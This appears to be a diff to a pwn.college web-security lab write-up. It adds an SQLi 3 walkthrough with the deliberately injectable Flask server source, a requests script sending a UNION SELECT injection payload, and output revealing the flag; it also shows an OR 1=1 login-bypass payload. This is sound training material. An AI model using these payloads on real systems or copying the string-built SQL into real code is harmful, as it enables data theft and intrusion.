@@ -1153,7 +1153,7 @@ This time, there are single quotes (`'`) around the `password`. We can easily wo
 
 Let's try the following credentials:
 
-| identity | pin |
+| identity | pass |
 |-|-|
 | admin | 0' OR 1=1-- - |
 
@@ -1187,5 +1187,113 @@ hacker@web-security~sqli-2:/$ python ~/script.py
         <form method=post>
         User:<input type=text name=identity>Password:<input type=text name=pass><input type=submit value=Submit>
         </form>
+        </body></html>
+```
+
+&nbsp;
+
+## SQLi 3
+
+### Source code
+```py title="/challenge/server" showLineNumbers
+#!/opt/pwn.college/python
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+db.execute(f"""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
+# https://www.sqlite.org/lang_insert.html
+db.execute(f"""INSERT INTO users SELECT "guest" as username, "password" as password""")
+
+
+@app.route("/", methods=["GET"])
+def challenge():
+    query = flask.request.args.get("query", "%")
+
+    try:
+
+        # https://www.sqlite.org/lang_select.html
+        sql = f'SELECT username FROM users WHERE username LIKE "{query}"'
+        print(f"DEBUG: {query=}")
+        results = "\n".join(user["username"] for user in db.execute(sql).fetchall())
+    except sqlite3.Error as e:
+        results = f"SQL error: {e}"
+
+    return f"""
+        <html><body>Welcome to the user query service!
+        <form>Query:<input type=text name=query value='{query}'><input type=submit value=Submit></form>
+        <hr>
+        <b>Query:</b> <pre>{ sql }</pre><br>
+        <b>Results:</b><pre>{results}</pre>
+        </body></html>
+        """
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+```py title="~/script.py" showLineNumbers
+import requests
+
+url = "http://challenge.localhost:80"
+params = {
+    "query": 'admin" UNION SELECT password FROM users WHERE username="admin"-- -'
+}
+response = requests.get(url, params = params)
+print(response.text)
+```
+
+This time the flag is stored in the `password` field of the `admin` user. However, the `password` is never printed in the original query:
+
+```sql
+SELECT username FROM users WHERE username LIKE "{query}"
+```
+
+Let's try the following parameters:
+
+| query |
+|-|
+| admin" UNION SELECT password FROM users WHERE username="admin"-- - |
+
+The resultant SQL query will be:
+
+```sql
+SELECT username FROM users WHERE username LIKE "admin" UNION SELECT password FROM users WHERE username="admin"-- -"
+```
+
+```
+hacker@web-security~sqli-3:/$ python ~/script.py 
+
+        <html><body>Welcome to the user query service!
+        <form>Query:<input type=text name=query value='admin" UNION SELECT password FROM users WHERE username="admin"-- -'><input type=submit value=Submit></form>
+        <hr>
+        <b>Query:</b> <pre>SELECT username FROM users WHERE username LIKE "admin" UNION SELECT password FROM users WHERE username="admin"-- -"</pre><br>
+        <b>Results:</b><pre>admin
+pwn.college{wz14oEOmcepM7OVPxb4zm3bCC2L.dFTOzMDL4ITM0EzW}
+</pre>
         </body></html>
 ```
